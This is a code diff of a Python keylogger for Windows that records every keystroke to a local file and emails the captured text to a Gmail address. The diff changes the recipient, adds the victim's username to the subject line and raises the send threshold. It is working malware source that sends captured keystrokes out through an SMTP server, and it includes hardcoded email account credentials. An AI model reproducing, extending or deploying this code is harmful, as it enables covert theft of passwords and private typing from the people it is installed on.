@@ -1,6 +1,7 @@
-import pyHook,pythoncom,sys,logging
+import pyHook,pythoncom
 import smtplib
 from email.mime.text import MIMEText
+import getpass
 
 file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt','w+')
 buffer = file_log.read()
@@ -8,14 +9,15 @@ file_log.close()
 
 def sendEmail(keyMessage):
     try:
+        user = getpass.getuser()
         fromaddr = 'keyhunter.hackspc@gmail.com'
-        username = 'wembleywilliams@gmail.com'
-        password = 'leonardo16'
+        username = 'hackdemdead@gmail.com'
+        password = 'leonardo19'
         keyMessage += "<br><br>" + "Keys have been logged master"
         msg = MIMEText(keyMessage,'html')
-        msg['Subject'] = "Simple Key Logger"
+        msg['Subject'] = "Keys Logged From User: " + user
         msg['Reply-to'] = 'no-reply'
-        msg['To'] = 'wembleywilliams@gmail.com'
+        msg['To'] = 'hackdemdead@gmail.com'
         server = smtplib.SMTP('smtp.gmail.com:587')
         server.starttls()
         server.login(username, password)
@@ -31,7 +33,7 @@ def OnKeyboardEvent(event):
     file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt','r+')
     buffer = file_log.read()
     file_log.close()
-    if len(buffer) > 70:
+    if len(buffer) > 500:
         sendEmail(buffer[-1000:].replace("\n", "<br>"))
 
     file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt',  'w')
